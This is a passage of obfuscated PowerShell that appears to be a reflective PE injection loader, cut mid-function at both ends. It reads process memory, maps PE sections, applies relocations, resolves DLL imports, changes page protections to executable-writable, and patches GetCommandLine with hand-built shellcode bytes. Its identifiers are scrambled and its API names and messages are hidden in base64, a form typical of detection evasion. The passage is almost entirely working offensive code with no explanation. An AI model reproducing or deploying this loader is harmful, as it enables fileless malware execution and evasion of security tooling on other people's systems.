		${_/==\/=\__/\___/\} = $Win32Functions.ReadProcessMemory.Invoke(${__/\_/\__/\/\__/\/}, ${/=\__/=\___/\/\_/}, ${___/=\/=\______/=}, [UIntPtr][UInt64]${/=\/==\___/=\/\_/}, [Ref]${_/=\/==\_/\______})
		if ((${_/==\/=\__/\___/\} -eq $false) -or (${_/=\/==\_/\______} -eq 0))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFIAZQBhAGQAUAByAG8AYwBlAHMAcwBNAGUAbQBvAHIAeQAgAGYAYQBpAGwAZQBkAA==')))
		}
		[IntPtr]${____/\_/=\__/=\__} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${___/=\/=\______/=}, [Type][IntPtr])
		$Win32Functions.VirtualFreeEx.Invoke(${__/\_/\__/\/\__/\/}, ${__/\/\/=\__/=\/==}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke(${__/\_/\__/\/\__/\/}, ${/=\__/=\___/\/\_/}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        if (-not ${____/==\__/=\__/\/})
        {
            $Win32Functions.VirtualFreeEx.Invoke(${__/\_/\__/\/\__/\/}, ${/==\__/=\/\/\/=\/}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
		return ${____/\_/=\__/=\__}
	}
	Function ___/\__/=\/\/\/=\/
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${_/=====\_/=\/\___/},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		for( ${/=\/\/\/\_______/} = 0; ${/=\/\/\/\_______/} -lt ${_/=====\_/=\/\___/}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${/=\/\/\/\_______/}++)
		{
			[IntPtr]${/=\_/==\/=\__/===} = [IntPtr](____/\____/====\/= ([Int64]${_/=====\_/=\/\___/}.SectionHeaderPtr) (${/=\/\/\/\_______/} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			${/\____/=\/=\/\/\/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/=\_/==\/=\__/===}, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]${_/\/==\______/\/=} = [IntPtr](____/\____/====\/= ([Int64]${_/=====\_/=\/\___/}.PEHandle) ([Int64]${/\____/=\/=\/\/\/}.VirtualAddress))
			${/====\/\/\/=\/===} = ${/\____/=\/=\/\/\/}.SizeOfRawData
			if (${/\____/=\/=\/\/\/}.PointerToRawData -eq 0)
			{
				${/====\/\/\/=\/===} = 0
			}
			if (${/====\/\/\/=\/===} -gt ${/\____/=\/=\/\/\/}.VirtualSize)
			{
				${/====\/\/\/=\/===} = ${/\____/=\/=\/\/\/}.VirtualSize
			}
			if (${/====\/\/\/=\/===} -gt 0)
			{
				__/==\/===\___/=\/ -_/=====\_/=\___/== $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAtAFMAZQBjAHQAaQBvAG4AcwA6ADoATQBhAHIAcwBoAGEAbABDAG8AcAB5AA=='))) -_/=====\_/=\/\___/ ${_/=====\_/=\/\___/} -_/==\__/=\_/=\/\_/ ${_/\/==\______/\/=} -_____/=\_/\_/===\_ ${/====\/\/\/=\/===} | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]${/\____/=\/=\/\/\/}.PointerToRawData, ${_/\/==\______/\/=}, ${/====\/\/\/=\/===})
			}
			if (${/\____/=\/=\/\/\/}.SizeOfRawData -lt ${/\____/=\/=\/\/\/}.VirtualSize)
			{
				${/=\/\___/\/\__/=\} = ${/\____/=\/=\/\/\/}.VirtualSize - ${/====\/\/\/=\/===}
				[IntPtr]${_/==\__/=\_/=\/\_/} = [IntPtr](____/\____/====\/= ([Int64]${_/\/==\______/\/=}) ([Int64]${/====\/\/\/=\/===}))
				__/==\/===\___/=\/ -_/=====\_/=\___/== $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAtAFMAZQBjAHQAaQBvAG4AcwA6ADoATQBlAG0AcwBlAHQA'))) -_/=====\_/=\/\___/ ${_/=====\_/=\/\___/} -_/==\__/=\_/=\/\_/ ${_/==\__/=\_/=\/\_/} -_____/=\_/\_/===\_ ${/=\/\___/\/\__/=\} | Out-Null
				$Win32Functions.memset.Invoke(${_/==\__/=\_/=\/\_/}, 0, [IntPtr]${/=\/\___/\/\__/=\}) | Out-Null
			}
		}
	}
	Function ___/\__/=\/\/\___/
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${_/=====\_/=\/\___/},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${___/==\__/\/=\/\_/},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		[Int64]${_/\_/\/==\_/\/=\/} = 0
		${/=====\__/===\___} = $true 
		[UInt32]${_/====\/\_/\/\__/} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		if ((${___/==\__/\/=\/\_/} -eq [Int64]${_/=====\_/=\/\___/}.EffectivePEHandle) `
				-or (${_/=====\_/=\/\___/}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}
		elseif ((__/=\/\/=\/\_/==\_ (${___/==\__/\/=\/\_/}) (${_/=====\_/=\/\___/}.EffectivePEHandle)) -eq $true)
		{
			${_/\_/\/==\_/\/=\/} = _/\____/===\/\_/== (${___/==\__/\/=\/\_/}) (${_/=====\_/=\/\___/}.EffectivePEHandle)
			${/=====\__/===\___} = $false
		}
		elseif ((__/=\/\/=\/\_/==\_ (${_/=====\_/=\/\___/}.EffectivePEHandle) (${___/==\__/\/=\/\_/})) -eq $true)
		{
			${_/\_/\/==\_/\/=\/} = _/\____/===\/\_/== (${_/=====\_/=\/\___/}.EffectivePEHandle) (${___/==\__/\/=\/\_/})
		}
		[IntPtr]${___/\__/\_______/} = [IntPtr](____/\____/====\/= ([Int64]${_/=====\_/=\/\___/}.PEHandle) ([Int64]${_/=====\_/=\/\___/}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			${__/\__/=\/===\/==} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${___/\__/\_______/}, [Type]$Win32Types.IMAGE_BASE_RELOCATION)
			if (${__/\__/=\/===\/==}.SizeOfBlock -eq 0)
			{
				break
			}
			[IntPtr]${/==\___/\/\___/=\} = [IntPtr](____/\____/====\/= ([Int64]${_/=====\_/=\/\___/}.PEHandle) ([Int64]${__/\__/=\/===\/==}.VirtualAddress))
			${___/\/=\___/==\/=} = (${__/\__/=\/===\/==}.SizeOfBlock - ${_/====\/\_/\/\__/}) / 2
			for(${/=\/\/\/\_______/} = 0; ${/=\/\/\/\_______/} -lt ${___/\/=\___/==\/=}; ${/=\/\/\/\_______/}++)
			{
				${_____/\_/=\/==\/\} = [IntPtr](____/\____/====\/= ([IntPtr]${___/\__/\_______/}) ([Int64]${_/====\/\_/\/\__/} + (2 * ${/=\/\/\/\_______/})))
				[UInt16]${_/\_______/=\/==\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_____/\_/=\/==\/\}, [Type][UInt16])
				[UInt16]${/=\_/=\/\/=\/\__/} = ${_/\_______/=\/==\} -band 0x0FFF
				[UInt16]${_/\/=\/\/=\____/=} = ${_/\_______/=\/==\} -band 0xF000
				for (${_/=\/\/\/=\/\___/} = 0; ${_/=\/\/\/=\/\___/} -lt 12; ${_/=\/\/\/=\/\___/}++)
				{
					${_/\/=\/\/=\____/=} = [Math]::Floor(${_/\/=\/\/=\____/=} / 2)
				}
				if ((${_/\/=\/\/=\____/=} -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or (${_/\/=\/\/=\____/=} -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					[IntPtr]${_/==\__/=\_/=\_/\} = [IntPtr](____/\____/====\/= ([Int64]${/==\___/\/\___/=\}) ([Int64]${/=\_/=\/\/=\/\__/}))
					[IntPtr]${__/\_/\/\_____/\/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/==\__/=\_/=\_/\}, [Type][IntPtr])
					if (${/=====\__/===\___} -eq $true)
					{
						[IntPtr]${__/\_/\/\_____/\/} = [IntPtr](____/\____/====\/= ([Int64]${__/\_/\/\_____/\/}) (${_/\_/\/==\_/\/=\/}))
					}
					else
					{
						[IntPtr]${__/\_/\/\_____/\/} = [IntPtr](_/\____/===\/\_/== ([Int64]${__/\_/\/\_____/\/}) (${_/\_/\/==\_/\/=\/}))
					}				
					[System.Runtime.InteropServices.Marshal]::StructureToPtr(${__/\_/\/\_____/\/}, ${_/==\__/=\_/=\_/\}, $false) | Out-Null
				}
				elseif (${_/\/=\/\/=\____/=} -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgAgAHIAZQBsAG8AYwBhAHQAaQBvAG4AIABmAG8AdQBuAGQALAAgAHIAZQBsAG8AYwBhAHQAaQBvAG4AIAB2AGEAbAB1AGUAOgAgACQAewBfAC8AXAAvAD0AXAAvAFwALwA9AFwAXwBfAF8AXwAvAD0AfQAsACAAcgBlAGwAbwBjAGEAdABpAG8AbgBpAG4AZgBvADoAIAAkAHsAXwAvAFwAXwBfAF8AXwBfAF8AXwAvAD0AXAAvAD0APQBcAH0A')))
				}
			}
			${___/\__/\_______/} = [IntPtr](____/\____/====\/= ([Int64]${___/\__/\_______/}) ([Int64]${__/\__/=\/===\/==}.SizeOfBlock))
		}
	}
	Function _/=\_/\/==\___/\_/
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${_/=====\_/=\/\___/},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		${__/\_/\__/\/\__/\/}
		)
		${___/=\/=\/\_/\_/=} = $false
		if (${_/=====\_/=\/\___/}.PEHandle -ne ${_/=====\_/=\/\___/}.EffectivePEHandle)
		{
			${___/=\/=\/\_/\_/=} = $true
		}
		if (${_/=====\_/=\/\___/}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]${___/\__/=\/\_/\/\} = ____/\____/====\/= ([Int64]${_/=====\_/=\/\___/}.PEHandle) ([Int64]${_/=====\_/=\/\___/}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			while ($true)
			{
				${___/\_/\_/==\_/\_} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${___/\__/=\/\_/\/\}, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				if (${___/\_/\_/==\_/\_}.Characteristics -eq 0 `
						-and ${___/\_/\_/==\_/\_}.FirstThunk -eq 0 `
						-and ${___/\_/\_/==\_/\_}.ForwarderChain -eq 0 `
						-and ${___/\_/\_/==\_/\_}.Name -eq 0 `
						-and ${___/\_/\_/==\_/\_}.TimeDateStamp -eq 0)
				{
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAgAGkAbQBwAG8AcgB0AGkAbgBnACAARABMAEwAIABpAG0AcABvAHIAdABzAA==')))
					break
				}
				${__/\/\/=====\/===} = [IntPtr]::Zero
				${__/\/=\_/=\/\_/==\} = (____/\____/====\/= ([Int64]${_/=====\_/=\/\___/}.PEHandle) ([Int64]${___/\_/\_/==\_/\_}.Name))
				${_/===\_/==\/=====} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${__/\/=\_/=\/\_/==\})
				if (${___/=\/=\/\_/\_/=} -eq $true)
				{
					${__/\/\/=====\/===} = __/\/=\/======\___ -__/\_/\__/\/\__/\/ ${__/\_/\__/\/\__/\/} -__/\/=\_/=\/\_/==\ ${__/\/=\_/=\/\_/==\}
				}
				else
				{
					${__/\/\/=====\/===} = $Win32Functions.LoadLibrary.Invoke(${_/===\_/==\/=====})
				}
				if ((${__/\/\/=====\/===} -eq $null) -or (${__/\/\/=====\/===} -eq [IntPtr]::Zero))
				{
					throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBtAHAAbwByAHQAaQBuAGcAIABEAEwATAAsACAARABMAEwATgBhAG0AZQA6ACAAJAB7AF8ALwA9AD0APQBcAF8ALwA9AD0AXAAvAD0APQA9AD0APQB9AA==')))
				}
				[IntPtr]${__/==\/=\/=\__/\/} = ____/\____/====\/= (${_/=====\_/=\/\___/}.PEHandle) (${___/\_/\_/==\_/\_}.FirstThunk)
				[IntPtr]${_____/===\__/\/\/} = ____/\____/====\/= (${_/=====\_/=\/\___/}.PEHandle) (${___/\_/\_/==\_/\_}.Characteristics) 
				[IntPtr]${__/===\/==\/\/\/\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_____/===\__/\/\/}, [Type][IntPtr])
				while (${__/===\/==\/\/\/\} -ne [IntPtr]::Zero)
				{
                    ${____/==\__/=\__/\/} = $false
                    [IntPtr]${___/======\/=====} = [IntPtr]::Zero
					[IntPtr]${_/==\_/==\_/==\/=} = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]${__/===\/==\/\/\/\} -lt 0)
					{
						[IntPtr]${___/======\/=====} = [IntPtr]${__/===\/==\/\/\/\} -band 0xffff 
                        ${____/==\__/=\__/\/} = $true
					}
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]${__/===\/==\/\/\/\} -lt 0)
					{
						[IntPtr]${___/======\/=====} = [Int64]${__/===\/==\/\/\/\} -band 0xffff 
                        ${____/==\__/=\__/\/} = $true
					}
					else
					{
						[IntPtr]${_/\/\/\_/===\__/=} = ____/\____/====\/= (${_/=====\_/=\/\___/}.PEHandle) (${__/===\/==\/\/\/\})
						${_/\/\/\_/===\__/=} = ____/\____/====\/= ${_/\/\/\_/===\__/=} ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						${__/======\/\_/\/=} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${_/\/\/\_/===\__/=})
                        ${___/======\/=====} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${__/======\/\_/\/=})
					}
					if (${___/=\/=\/\_/\_/=} -eq $true)
					{
						[IntPtr]${_/==\_/==\_/==\/=} = __/\/==\/\___/==== -__/\_/\__/\/\__/\/ ${__/\_/\__/\/\__/\/} -___/\/====\_/\___/ ${__/\/\/=====\/===} -___/\_____/=\/=\/\ ${___/======\/=====} -____/==\__/=\__/\/ ${____/==\__/=\__/\/}
					}
					else
					{
				        [IntPtr]${_/==\_/==\_/==\/=} = $Win32Functions.GetProcAddressIntPtr.Invoke(${__/\/\/=====\/===}, ${___/======\/=====})
					}
					if (${_/==\_/==\_/==\/=} -eq $null -or ${_/==\_/==\_/==\/=} -eq [IntPtr]::Zero)
					{
                        if (${____/==\__/=\__/\/})
                        {
                            Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHcAIABmAHUAbgBjAHQAaQBvAG4AIAByAGUAZgBlAHIAZQBuAGMAZQAgAGkAcwAgAG4AdQBsAGwALAAgAHQAaABpAHMAIABpAHMAIABhAGwAbQBvAHMAdAAgAGMAZQByAHQAYQBpAG4AbAB5ACAAYQAgAGIAdQBnACAAaQBuACAAdABoAGkAcwAgAHMAYwByAGkAcAB0AC4AIABGAHUAbgBjAHQAaQBvAG4AIABPAHIAZABpAG4AYQBsADoAIAAkAHsAXwBfAF8ALwA9AD0APQA9AD0APQBcAC8APQA9AD0APQA9AH0ALgAgAEQAbABsADoAIAAkAHsAXwAvAD0APQA9AFwAXwAvAD0APQBcAC8APQA9AD0APQA9AH0A')))
                        }
                        else
                        {
						    Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHcAIABmAHUAbgBjAHQAaQBvAG4AIAByAGUAZgBlAHIAZQBuAGMAZQAgAGkAcwAgAG4AdQBsAGwALAAgAHQAaABpAHMAIABpAHMAIABhAGwAbQBvAHMAdAAgAGMAZQByAHQAYQBpAG4AbAB5ACAAYQAgAGIAdQBnACAAaQBuACAAdABoAGkAcwAgAHMAYwByAGkAcAB0AC4AIABGAHUAbgBjAHQAaQBvAG4AOgAgACQAewBfAF8ALwA9AD0APQA9AD0APQBcAC8AXABfAC8AXAAvAD0AfQAuACAARABsAGwAOgAgACQAewBfAC8APQA9AD0AXABfAC8APQA9AFwALwA9AD0APQA9AD0AfQA=')))
                        }
					}
					[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/==\_/==\_/==\/=}, ${__/==\/=\/=\__/\/}, $false)
					${__/==\/=\/=\__/\/} = ____/\____/====\/= ([Int64]${__/==\/=\/=\__/\/}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]${_____/===\__/\/\/} = ____/\____/====\/= ([Int64]${_____/===\__/\/\/}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]${__/===\/==\/\/\/\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_____/===\__/\/\/}, [Type][IntPtr])
                    if ((-not ${____/==\__/=\__/\/}) -and (${___/======\/=====} -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${___/======\/=====})
                        ${___/======\/=====} = [IntPtr]::Zero
                    }
				}
				${___/\__/=\/\_/\/\} = ____/\____/====\/= (${___/\__/=\/\_/\/\}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}
	Function _/\_________/===\/
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		${___/\_/\_/\/\/\_/\}
		)
		${____/\/=\/\/=\___} = 0x0
		if ((${___/\_/\_/\/\/\_/\} -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if ((${___/\_/\_/\/\/\_/\} -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if ((${___/\_/\_/\/\/\_/\} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${____/\/=\/\/=\___} = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					${____/\/=\/\/=\___} = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if ((${___/\_/\_/\/\/\_/\} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${____/\/=\/\/=\___} = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					${____/\/=\/\/=\___} = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if ((${___/\_/\_/\/\/\_/\} -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if ((${___/\_/\_/\/\/\_/\} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${____/\/=\/\/=\___} = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					${____/\/=\/\/=\___} = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if ((${___/\_/\_/\/\/\_/\} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${____/\/=\/\/=\___} = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					${____/\/=\/\/=\___} = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		if ((${___/\_/\_/\/\/\_/\} -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			${____/\/=\/\/=\___} = ${____/\/=\/\/=\___} -bor $Win32Constants.PAGE_NOCACHE
		}
		return ${____/\/=\/\/=\___}
	}
	Function __/=\_/\/\_/\/=\/\
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${_/=====\_/=\/\___/},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		for( ${/=\/\/\/\_______/} = 0; ${/=\/\/\/\_______/} -lt ${_/=====\_/=\/\___/}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${/=\/\/\/\_______/}++)
		{
			[IntPtr]${/=\_/==\/=\__/===} = [IntPtr](____/\____/====\/= ([Int64]${_/=====\_/=\/\___/}.SectionHeaderPtr) (${/=\/\/\/\_______/} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			${/\____/=\/=\/\/\/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/=\_/==\/=\__/===}, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]${/=\_/\_/==\_____/} = ____/\____/====\/= (${_/=====\_/=\/\___/}.PEHandle) (${/\____/=\/=\/\/\/}.VirtualAddress)
			[UInt32]${_/\__/\_/=\/\____} = _/\_________/===\/ ${/\____/=\/=\/\/\/}.Characteristics
			[UInt32]${__/===\__/=\_/=\/} = ${/\____/=\/=\/\/\/}.VirtualSize
			[UInt32]${__/\__/\__/\___/=} = 0
			__/==\/===\___/=\/ -_/=====\_/=\___/== $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUALQBNAGUAbQBvAHIAeQBQAHIAbwB0AGUAYwB0AGkAbwBuAEYAbABhAGcAcwA6ADoAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0AA=='))) -_/=====\_/=\/\___/ ${_/=====\_/=\/\___/} -_/==\__/=\_/=\/\_/ ${/=\_/\_/==\_____/} -_____/=\_/\_/===\_ ${__/===\__/=\_/=\/} | Out-Null
			${_/\_/\__/\/=\/\/\} = $Win32Functions.VirtualProtect.Invoke(${/=\_/\_/==\_____/}, ${__/===\__/=\_/=\/}, ${_/\__/\_/=\/\____}, [Ref]${__/\__/\__/\___/=})
			if (${_/\_/\__/\/=\/\/\} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGgAYQBuAGcAZQAgAG0AZQBtAG8AcgB5ACAAcAByAG8AdABlAGMAdABpAG8AbgA=')))
			}
		}
	}
	Function ____/\/=\/\_/\/=\/
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${_/=====\_/=\/\___/},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		${__/\/==\_/=\/===\_},
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		${__/=\____/=\/==\/=}
		)
		${/=\___/===\___/\_} = @() 
		${/=\/==\___/=\/\_/} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]${__/\__/\__/\___/=} = 0
		[IntPtr]${___/\___/\___/\__} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		if (${___/\___/\___/\__} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAMwAyACAAaABhAG4AZABsAGUAIABuAHUAbABsAA==')))
		}
		[IntPtr]${_/\/\/=====\/==\_} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAQgBhAHMAZQAuAGQAbABsAA=='))))
		if (${_/\/\/=====\/==\_} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAQgBhAHMAZQAgAGgAYQBuAGQAbABlACAAbgB1AGwAbAA=')))
		}
		${/==\/=\_/=\/===\_} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${__/\/==\_/=\/===\_})
		${/==\_/\/==\_/====} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${__/\/==\_/=\/===\_})
		[IntPtr]${/====\/=\_/=\__/\} = $Win32Functions.GetProcAddress.Invoke(${_/\/\/=====\/==\_}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlAEEA'))))
		[IntPtr]${/===\/\_/=\/\/\__} = $Win32Functions.GetProcAddress.Invoke(${_/\/\/=====\/==\_}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlAFcA'))))
		if (${/====\/=\_/=\__/\} -eq [IntPtr]::Zero -or ${/===\/\_/=\/\/\__} -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(_/==\___/==\/\___/ ${/====\/=\_/=\__/\}). GetCommandLineW: $(_/==\___/==\/\___/ ${/===\/\_/=\/\/\__})"
		}
		[Byte[]]${___/=\______/\_/\} = @()
		if (${/=\/==\___/=\/\_/} -eq 8)
		{
			${___/=\______/\_/\} += 0x48	
		}
		${___/=\______/\_/\} += 0xb8
		[Byte[]]${____/===\___/\/\_} = @(0xc3)
		${/=\__/\___/=\__/\} = ${___/=\______/\_/\}.Length + ${/=\/==\___/=\/\_/} + ${____/===\___/\/\_}.Length
		${/=\/=\_/\/=\/\/\/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/=\__/\___/=\__/\})
		${_____/==\__/\/\/=} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/=\__/\___/=\__/\})
		$Win32Functions.memcpy.Invoke(${/=\/=\_/\/=\/\/\/}, ${/====\/=\_/=\__/\}, [UInt64]${/=\__/\___/=\__/\}) | Out-Null
		$Win32Functions.memcpy.Invoke(${_____/==\__/\/\/=}, ${/===\/\_/=\/\/\__}, [UInt64]${/=\__/\___/=\__/\}) | Out-Null
		${/=\___/===\___/\_} += ,(${/====\/=\_/=\__/\}, ${/=\/=\_/\/=\/\/\/}, ${/=\__/\___/=\__/\})
		${/=\___/===\___/\_} += ,(${/===\/\_/=\/\/\__}, ${_____/==\__/\/\/=}, ${/=\__/\___/=\__/\})
		[UInt32]${__/\__/\__/\___/=} = 0
		${_/\_/\__/\/=\/\/\} = $Win32Functions.VirtualProtect.Invoke(${/====\/=\_/=\__/\}, [UInt32]${/=\__/\___/=\__/\}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${__/\__/\__/\___/=})
		if (${_/\_/\__/\/=\/\/\} = $false)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
		}
		${___/=\_/====\_/\_} = ${/====\/=\_/=\__/\}
		__/\/\/===\__/==\/ -_/=\/=\_/\_____/=\ ${___/=\______/\_/\} -__/\/\/\__/\_/\/\_ ${___/=\_/====\_/\_}
		${___/=\_/====\_/\_} = ____/\____/====\/= ${___/=\_/====\_/\_} (${___/=\______/\_/\}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/==\_/\/==\_/====}, ${___/=\_/====\_/\_}, $false)
		${___/=\_/====\_/\_} = ____/\____/====\/= ${___/=\_/====\_/\_} ${/=\/==\___/=\/\_/}
		__/\/\/===\__/==\/ -_/=\/=\_/\_____/=\ ${____/===\___/\/\_} -__/\/\/\__/\_/\/\_ ${___/=\_/====\_/\_}
		$Win32Functions.VirtualProtect.Invoke(${/====\/=\_/=\__/\}, [UInt32]${/=\__/\___/=\__/\}, [UInt32]${__/\__/\__/\___/=}, [Ref]${__/\__/\__/\___/=}) | Out-Null
		[UInt32]${__/\__/\__/\___/=} = 0
		${_/\_/\__/\/=\/\/\} = $Win32Functions.VirtualProtect.Invoke(${/===\/\_/=\/\/\__}, [UInt32]${/=\__/\___/=\__/\}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${__/\__/\__/\___/=})
		if (${_/\_/\__/\/=\/\/\} = $false)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
		}
		${/==\_/=\_/=\__/\/} = ${/===\/\_/=\/\/\__}
